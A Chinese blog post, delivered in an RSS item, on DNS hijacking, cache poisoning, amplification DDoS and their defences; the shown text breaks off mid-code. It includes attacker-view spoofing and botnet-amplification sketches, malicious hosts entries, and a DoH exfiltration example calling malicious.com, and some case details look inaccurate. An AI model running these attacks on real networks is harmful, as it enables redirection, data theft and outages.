<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[DNS安全威胁：从劫持、污染到放大攻击的演练]]></title>    <link>https://juejin.cn/post/7589907831199203354</link>    <guid>https://juejin.cn/post/7589907831199203354</guid>    <pubDate>2026-01-01T10:29:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589907831199203354" data-draft-id="7589839019716542514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="DNS安全威胁：从劫持、污染到放大攻击的演练"/> <meta itemprop="keywords" content="安全,网络协议"/> <meta itemprop="datePublished" content="2026-01-01T10:29:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sweet丶"/> <meta itemprop="url" content="https://juejin.cn/user/3227821869921646"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            DNS安全威胁：从劫持、污染到放大攻击的演练
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821869921646/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sweet丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:29:04.000Z" title="Thu Jan 01 2026 10:29:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>前言：DNS——互联网的“隐形电话簿”</strong></h2>
<p>想象一下，如果没有DNS，访问每个网站都需要记住一串像<code>192.168.1.1</code>这样的数字。DNS让互联网变得人性化，但正是这个每日处理<strong>数千亿次查询</strong>的系统，却成为了网络攻击者的黄金目标。今天，我们将深入探索DNS世界的阴暗面，了解那些威胁我们网络安全的各种攻击手段。</p>
<h2 data-id="heading-1"><strong>一、DNS劫持：当你的导航系统被黑客接管</strong></h2>
<h3 data-id="heading-2"><strong>1.1 什么是DNS劫持？</strong></h3>
<p>DNS劫持就像有人修改了你的GPS导航系统，将“前往银行”的指令变成了“前往黑客的假银行”。</p>
<p><strong>技术原理</strong>：
攻击者通过中间人攻击或恶意软件，篡改DNS响应，将合法域名解析到恶意IP地址。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 攻击者视角的DNS劫持流程</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">dns_hijack_attack</span>():
    <span class="hljs-comment"># 1. 监控网络流量</span>
    sniff_packets(<span class="hljs-built_in">filter</span>=<span class="hljs-string">"udp port 53"</span>)
    
    <span class="hljs-comment"># 2. 拦截DNS查询</span>
    <span class="hljs-keyword">if</span> packet.haslayer(DNS) <span class="hljs-keyword">and</span> packet[DNS].qd.qname == <span class="hljs-string">"bank.com"</span>:
        <span class="hljs-comment"># 3. 伪造响应，指向恶意服务器</span>
        malicious_ip = <span class="hljs-string">"192.168.1.100"</span>
        send_spoofed_response(packet, malicious_ip)
    
    <span class="hljs-comment"># 用户访问bank.com，实际连接到攻击者服务器</span>
</code></pre>
<h3 data-id="heading-3"><strong>1.2 劫持的多种形式</strong></h3>
<h4 data-id="heading-4"><strong>路由器劫持</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 攻击者攻破家用路由器后修改DNS设置</span>
<span class="hljs-comment"># 原始配置：</span>
<span class="hljs-comment"># nameserver 8.8.8.8  # Google DNS</span>

<span class="hljs-comment"># 被篡改后：</span>
<span class="hljs-comment"># nameserver 10.0.0.1  # 攻击者控制的DNS服务器</span>
</code></pre>
<h4 data-id="heading-5"><strong>本地Hosts文件劫持</strong></h4>
<pre><code class="hljs language-plaintext" lang="plaintext"># Windows hosts文件位置：C:\Windows\System32\drivers\etc\hosts
# 恶意软件添加：
192.168.1.100  www.bank.com
192.168.1.100  www.paypal.com
# 所有银行访问都重定向到攻击者服务器
</code></pre>
<h4 data-id="heading-6"><strong>ISP级别的劫持</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 某些ISP会劫持不存在的域名</span>
<span class="hljs-comment">// 用户查询：nonexistent-website.com</span>
<span class="hljs-comment">// 正常响应：NXDOMAIN（域名不存在）</span>
<span class="hljs-comment">// 劫持响应：指向ISP的广告或搜索页面</span>
</code></pre>
<h3 data-id="heading-7"><strong>1.3 真实案例：巴西银行大劫案</strong></h3>
<p><strong>2016年巴西银行攻击</strong>：</p>
<ul>
<li><strong>手法</strong>：恶意软件修改路由器和电脑的DNS设置</li>
<li><strong>目标</strong>：40多家巴西银行</li>
<li><strong>损失</strong>：数百万美元</li>
<li><strong>技术细节</strong>：
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 恶意软件执行的DNS修改</span>
<span class="hljs-keyword">import</span> subprocess

<span class="hljs-comment"># 修改Windows DNS设置</span>
subprocess.run([
    <span class="hljs-string">'netsh'</span>, <span class="hljs-string">'interface'</span>, <span class="hljs-string">'ip'</span>, <span class="hljs-string">'set'</span>, <span class="hljs-string">'dns'</span>,
    <span class="hljs-string">'Ethernet'</span>, <span class="hljs-string">'static'</span>, <span class="hljs-string">'185.228.168.168'</span>
])

<span class="hljs-comment"># 185.228.168.168是攻击者控制的恶意DNS服务器</span>
</code></pre>
</li>
</ul>
<h2 data-id="heading-8"><strong>二、DNS污染：在互联网水源中投毒</strong></h2>
<h3 data-id="heading-9"><strong>2.1 DNS污染的工作原理</strong></h3>
<p>DNS污染又称DNS缓存投毒，攻击者向DNS缓存中注入虚假记录。</p>
<p><strong>攻击时序图</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    用户-&gt;&gt;本地DNS: 查询 evil.com
    本地DNS-&gt;&gt;根服务器: 查询 .com NS
    攻击者-&gt;&gt;本地DNS: 伪造响应(假的权威服务器)
    本地DNS-&gt;&gt;假权威服务器: 查询 evil.com
    假权威服务器-&gt;&gt;本地DNS: 返回恶意IP
    本地DNS-&gt;&gt;用户: 返回恶意IP
    用户-&gt;&gt;恶意网站: 访问 (被攻击)
</code></pre>
<h3 data-id="heading-10"><strong>2.2 技术实现细节</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DNSPoisoningAttack</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_dns_server</span>):
        self.target = target_dns_server
        self.transaction_id = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">65535</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">poison_cache</span>(<span class="hljs-params">self, domain, malicious_ip</span>):
        <span class="hljs-comment"># 关键：预测DNS查询的Transaction ID</span>
        <span class="hljs-keyword">for</span> txid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
            <span class="hljs-comment"># 伪造权威服务器响应</span>
            spoofed_response = IP(dst=self.target)/UDP(dport=<span class="hljs-number">53</span>)/DNS(
                <span class="hljs-built_in">id</span>=txid,
                qr=<span class="hljs-number">1</span>,  <span class="hljs-comment"># 响应标志</span>
                qd=DNSQR(qname=domain),
                an=DNSRR(rrname=domain, ttl=<span class="hljs-number">86400</span>, rdata=malicious_ip)
            )
            send(spoofed_response)
            
            <span class="hljs-comment"># 同时发送大量查询触发目标DNS的查询</span>
            trigger_query = IP(dst=self.target)/UDP()/DNS(
                <span class="hljs-built_in">id</span>=txid,
                qd=DNSQR(qname=domain)
            )
            send(trigger_query)
</code></pre>
<h3 data-id="heading-11"><strong>2.3 Kaminsky漏洞：改变游戏规则</strong></h3>
<p><strong>2008年发现</strong>，允许攻击者在秒级时间内污染DNS缓存：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">kaminsky_exploit</span>(<span class="hljs-params">target_dns, domain</span>):
    <span class="hljs-comment"># 1. 查询目标域名的子域名（每次不同）</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
        subdomain = <span class="hljs-string">f"<span class="hljs-subst">{random_string(<span class="hljs-number">10</span>)}</span>.<span class="hljs-subst">{domain}</span>"</span>
        
        <span class="hljs-comment"># 2. 触发目标DNS向上游查询</span>
        send_query(target_dns, subdomain)
        
        <span class="hljs-comment"># 3. 发送大量伪造响应，尝试预测Transaction ID</span>
        <span class="hljs-keyword">for</span> txid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
            send_spoofed_response(
                target_dns,
                subdomain,
                malicious_ip,
                txid
            )
        
        <span class="hljs-comment"># 4. 如果成功，整个域的缓存都被污染</span>
        <span class="hljs-keyword">if</span> check_poisoned(target_dns, domain):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h2 data-id="heading-12"><strong>三、DNS放大攻击：小问题引发大灾难</strong></h2>
<h3 data-id="heading-13"><strong>3.1 放大效应的数学原理</strong></h3>
<pre><code class="hljs language-scss" lang="scss">基本公式：放大倍数 = 响应大小 / 查询大小

查询例子：example<span class="hljs-selector-class">.com</span> ANY (<span class="hljs-number">60</span>字节)
响应例子：包含所有记录类型 (<span class="hljs-number">4000</span>字节)
放大倍数：<span class="hljs-number">4000</span> ÷ <span class="hljs-number">60</span> ≈ <span class="hljs-number">67</span>倍
</code></pre>
<p><strong>不同类型记录的放大效果</strong>：</p>









































<table><thead><tr><th>记录类型</th><th>查询大小</th><th>典型响应</th><th>放大倍数</th></tr></thead><tbody><tr><td>A记录</td><td>60字节</td><td>100字节</td><td>1.7倍</td></tr><tr><td>MX记录</td><td>60字节</td><td>500字节</td><td>8.3倍</td></tr><tr><td>TXT记录</td><td>60字节</td><td>3000字节</td><td>50倍</td></tr><tr><td>ANY记录</td><td>60字节</td><td>4000字节</td><td>67倍</td></tr><tr><td>DNSSEC</td><td>60字节</td><td>4000+字节</td><td>70+倍</td></tr></tbody></table>
<h3 data-id="heading-14"><strong>3.2 僵尸网络的规模化攻击</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DDoSBotnet</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, bot_count=<span class="hljs-number">10000</span></span>):
        self.bots = self.load_bots(bot_count)
        self.open_dns_servers = self.scan_open_resolvers()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">launch_amplification_attack</span>(<span class="hljs-params">self, victim_ip</span>):
        <span class="hljs-comment"># 每个僵尸执行</span>
        <span class="hljs-keyword">for</span> bot <span class="hljs-keyword">in</span> self.bots:
            <span class="hljs-comment"># 选择放大倍数最高的记录类型</span>
            record_type = self.select_optimal_record()
            
            <span class="hljs-comment"># 构造伪造请求</span>
            query = DNS(
                <span class="hljs-built_in">id</span>=random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">65535</span>),
                qd=DNSQR(qname=self.target_domain, qtype=record_type)
            )
            
            <span class="hljs-comment"># 发送到多个开放DNS服务器</span>
            <span class="hljs-keyword">for</span> dns_server <span class="hljs-keyword">in</span> self.open_dns_servers[:<span class="hljs-number">10</span>]:
                spoofed_packet = IP(
                    src=victim_ip,  <span class="hljs-comment"># 伪造源地址</span>
                    dst=dns_server
                )/UDP(sport=random_port(), dport=<span class="hljs-number">53</span>)/query
                
                bot.send(spoofed_packet)
        
        <span class="hljs-comment"># 计算总攻击流量</span>
        total_traffic = self.calculate_amplification()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"理论最大流量：<span class="hljs-subst">{total_traffic/<span class="hljs-number">1e9</span>:<span class="hljs-number">.2</span>f}</span> Gbps"</span>)
</code></pre>
<h3 data-id="heading-15"><strong>3.3 史上最大攻击：Dyn DNS事件分析</strong></h3>
<p><strong>2016年10月21日</strong>，针对Dyn DNS服务的攻击：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">攻击参数:</span>
  <span class="hljs-string">峰值流量:</span> <span class="hljs-number">1.2</span> <span class="hljs-string">Tbps</span>
  <span class="hljs-string">持续时间:</span> <span class="hljs-string">持续多波，每波约1小时</span>
  <span class="hljs-string">攻击源:</span> <span class="hljs-number">10</span><span class="hljs-number">-100</span><span class="hljs-string">万台IoT设备组成的Mirai僵尸网络</span>
  <span class="hljs-string">放大载体:</span> <span class="hljs-string">开放DNS递归服务器</span> <span class="hljs-string">+</span> <span class="hljs-string">NTP放大</span>
  <span class="hljs-string">受影响服务:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Twitter:</span> <span class="hljs-string">全球中断2小时</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">GitHub:</span> <span class="hljs-string">服务严重降级</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Netflix:</span> <span class="hljs-string">美国东海岸用户无法访问</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">纽约时报、华尔街日报等:</span> <span class="hljs-string">访问困难</span>
  
<span class="hljs-string">技术细节:</span>
  <span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">攻击组合:</span> <span class="hljs-string">DNS放大</span> <span class="hljs-string">+</span> <span class="hljs-string">NTP放大</span> <span class="hljs-string">+</span> <span class="hljs-string">SYN</span> <span class="hljs-string">Flood</span>
  <span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">查询类型:</span> <span class="hljs-string">主要使用ANY和TXT记录</span>
  <span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">伪造技术:</span> <span class="hljs-string">源地址随机化，难以追踪</span>
  <span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">躲避策略:</span> <span class="hljs-string">动态更换攻击目标和服务</span>
</code></pre>
<h2 data-id="heading-16"><strong>四、现代DNS威胁演进</strong></h2>
<h3 data-id="heading-17"><strong>4.1 DoH/DoT的新型威胁</strong></h3>
<p><strong>DNS over HTTPS (DoH) 的安全悖论</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// DoH虽然加密，但引入新问题</span>
<span class="hljs-keyword">const</span> dohThreats = {
    <span class="hljs-comment">// 1. 中心化风险</span>
    <span class="hljs-attr">centralization</span>: {
        <span class="hljs-attr">providers</span>: [<span class="hljs-string">'Cloudflare'</span>, <span class="hljs-string">'Google'</span>, <span class="hljs-string">'Quad9'</span>],
        <span class="hljs-attr">risk</span>: <span class="hljs-string">'单点故障，隐私集中'</span>
    },
    
    <span class="hljs-comment">// 2. 企业监控困难</span>
    <span class="hljs-attr">enterprise</span>: {
        <span class="hljs-attr">issue</span>: <span class="hljs-string">'绕过公司DNS策略'</span>,
        <span class="hljs-attr">example</span>: <span class="hljs-string">'恶意软件使用DoH外联C2服务器'</span>
    },
    
    <span class="hljs-comment">// 3. 协议识别问题</span>
    <span class="hljs-attr">detection</span>: {
        <span class="hljs-attr">challenge</span>: <span class="hljs-string">'DoH流量与普通HTTPS难以区分'</span>,
        <span class="hljs-attr">solution</span>: <span class="hljs-string">'深度包检测(DPI)'</span>
    }
};

<span class="hljs-comment">// 恶意软件利用DoH的示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MalwareWithDoH</span> {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">exfiltrateData</span>(<span class="hljs-params">data</span>) {
        <span class="hljs-comment">// 使用DoH隐藏DNS查询</span>
        <span class="hljs-keyword">const</span> dohUrl = <span class="hljs-string">'https://cloudflare-dns.com/dns-query'</span>;
        <span class="hljs-keyword">const</span> query = <span class="hljs-title function_">btoa</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        
        <span class="hljs-comment">// 将数据编码在DNS查询中</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">${dohUrl}</span>?name=<span class="hljs-subst">${query}</span>.malicious.com`</span>);
        
        <span class="hljs-comment">// 攻击者DNS服务器解析查询，提取数据</span>
        <span class="hljs-keyword">return</span> response.<span class="hljs-property">ok</span>;
    }
}
</code></pre>
<h3 data-id="heading-18"><strong>4.2 子域名劫持攻击</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SubdomainTakeover</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_vulnerable_subdomains</span>(<span class="hljs-params">self, domain</span>):
        <span class="hljs-comment"># 1. 枚举所有子域名</span>
        subdomains = self.enumerate_subdomains(domain)
        
        vulnerable = []
        <span class="hljs-keyword">for</span> sub <span class="hljs-keyword">in</span> subdomains:
            <span class="hljs-comment"># 2. 检查DNS记录但无主机服务的情况</span>
            dns_record = self.resolve_dns(sub)
            
            <span class="hljs-keyword">if</span> dns_record <span class="hljs-keyword">and</span> self.check_service_status(sub) == <span class="hljs-string">'no_host'</span>:
                <span class="hljs-comment"># 3. 常见易受攻击服务</span>
                <span class="hljs-keyword">if</span> dns_record[<span class="hljs-string">'type'</span>] <span class="hljs-keyword">in</span> [<span class="hljs-string">'CNAME'</span>, <span class="hljs-string">'NS'</span>]:
                    target = dns_record[<span class="hljs-string">'value'</span>]
                    
                    <span class="hljs-comment"># 4. 检查是否可以接管</span>
                    <span class="hljs-keyword">if</span> self.can_takeover(target):
                        vulnerable.append({
                            <span class="hljs-string">'subdomain'</span>: sub,
                            <span class="hljs-string">'record_type'</span>: dns_record[<span class="hljs-string">'type'</span>],
                            <span class="hljs-string">'target'</span>: target,
                            <span class="hljs-string">'risk'</span>: self.assess_risk(sub)
                        })
        
        <span class="hljs-keyword">return</span> vulnerable

<span class="hljs-comment"># 攻击示例：接管Heroku应用</span>
<span class="hljs-comment"># 1. 公司配置：help.example.com CNAME -&gt; help.herokuapp.com</span>
<span class="hljs-comment"># 2. 公司删除了Heroku应用，但忘记删除DNS记录</span>
<span class="hljs-comment"># 3. 攻击者注册help.herokuapp.com</span>
<span class="hljs-comment"># 4. 所有访问help.example.com的用户到达攻击者页面</span>
</code></pre>
<h3 data-id="heading-19"><strong>4.3 量子计算对DNS安全的威胁</strong></h3>
<p><strong>未来的威胁</strong>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">QuantumDNSThreat</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">quantum_dns_attack</span>(<span class="hljs-params">self, encrypted_traffic</span>):
        <span class="hljs-comment"># 量子计算机可以破解当前加密算法</span>
        algorithms_vulnerable = {
            <span class="hljs-string">'RSA-2048'</span>: <span class="hljs-string">'易受Shor算法攻击'</span>,
            <span class="hljs-string">'ECC-256'</span>: <span class="hljs-string">'易受Shor算法攻击'</span>,
            <span class="hljs-string">'AES-256'</span>: <span class="hljs-string">'需Grover算法，但可增强密钥'</span>
        }
        
        <span class="hljs-comment"># 对DNSSEC的影响</span>
        dnssec_vulnerabilities = [
            <span class="hljs-string">'RSA签名可被伪造'</span>,
            <span class="hljs-string">'密钥交换可能被截获'</span>,
            <span class="hljs-string">'需要后量子密码学'</span>
        ]
        
        <span class="hljs-comment"># 防御策略</span>
        defenses = {
            <span class="hljs-string">'当前'</span>: <span class="hljs-string">'DNSSEC + TLS 1.3'</span>,
            <span class="hljs-string">'过渡'</span>: <span class="hljs-string">'混合加密（经典+量子安全）'</span>,
            <span class="hljs-string">'未来'</span>: <span class="hljs-string">'后量子密码学标准'</span>
        }
</code></pre>
<h2 data-id="heading-20"><strong>五、全面防御策略</strong></h2>
<h3 data-id="heading-21"><strong>5.1 多层次防御体系</strong></h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[用户层] --&gt; B{防御措施}
    B --&gt; C[使用DoH/DoT]
    B --&gt; D[定期检查Hosts文件]
    B --&gt; E[保持软件更新]
    
    F[应用层] --&gt; G{防御措施}
    G --&gt; H[实现DNSSEC验证]
    G --&gt; I[使用证书锁定]
    G --&gt; J[多CDN策略]
    
    K[网络层] --&gt; L{防御措施}
    L --&gt; M[部署BCP38]
    L --&gt; N[DNS防火墙]
    L --&gt; O[流量清洗中心]
    
    P[DNS运营者] --&gt; Q{防御措施}
    Q --&gt; R[关闭开放递归]
    Q --&gt; S[实施RRL]
    Q --&gt; T[DNSSEC部署]
</code></pre>
<h3 data-id="heading-22"><strong>5.2 技术实现代码</strong></h3>
<h4 data-id="heading-23"><strong>DNSSEC验证实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> dns.resolver
<span class="hljs-keyword">import</span> dns.dnssec
<span class="hljs-keyword">import</span> dns.rdatatype

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DNSSECValidator</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_with_dnssec</span>(<span class="hljs-params">self, domain</span>):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 1. 获取DNSKEY记录</span>
            dnskey_response = dns.resolver.resolve(domain, <span class="hljs-string">'DNSKEY'</span>)
            
            <span class="hljs-comment"># 2. 获取RRSIG记录</span>
            rrsig_response = dns.resolver.resolve(domain, <span class="hljs-string">'RRSIG'</span>)
            
            <span class="hljs-comment"># 3. 验证签名链</span>
            dns.dnssec.validate(
                dnskey_response.rrset,
                rrsig_response.rrset,
                {domain: dnskey_response.rrset}
            )
            
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✓ <span class="hljs-subst">{domain}</span> DNSSEC验证通过"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            
        <span class="hljs-keyword">except</span> dns.dnssec.ValidationFailure <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✗ <span class="hljs-subst">{domain}</span> DNSSEC验证失败: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">except</span> dns.resolver.NoAnswer:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"? <span class="hljs-subst">{domain}</span> 未配置DNSSEC"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h4 data-id="heading-24"><strong>DNS防火墙规则示例</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用iptables构建DNS防火墙</span>
<span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-comment"># 1. 基础防护</span>
iptables -A INPUT -p udp --dport 53 -m state --state NEW -m recent \
  --<span class="hljs-built_in">set</span> --name dnsquery --rsource

<span class="hljs-comment"># 2. 限制查询频率</span>
iptables -A INPUT -p udp --dport 53 -m state --state NEW -m recent \
  --update --seconds 1 --hitcount 5 --name dnsquery --rsource -j DROP

<span class="hljs-comment"># 3. 阻止ANY查询攻击</span>
iptables -A INPUT -p udp --dport 53 -m string \
  --algo bm --hex-string <span class="hljs-string">"|00ff0001|"</span> -j DROP

<span class="hljs-comment"># 4. 响应速率限制（使用DNS服务器功能）</span>
<span class="hljs-comment"># BIND配置：</span>
<span class="hljs-comment"># rate-limit {</span>
<span class="hljs-comment">#   responses-per-second 10;</span>
<span class="hljs-comment">#   slip 2;</span>
<span class="hljs-comment">#   window 5;</span>
<span class="hljs-comment"># };</span>

<span class="hljs-comment"># 5. 监控和报警</span>
iptables -A INPUT -p udp --dport 53 -j LOG \
  --log-prefix <span class="hljs-string">"DNS-Query: "</span> --log-level 6
</code></pre>
<h3 data-id="heading-25"><strong>5.3 企业级防护架构</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnterpriseDNSProtection</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.components = {
            <span class="hljs-string">'dns_firewall'</span>: DNSFirewall(),
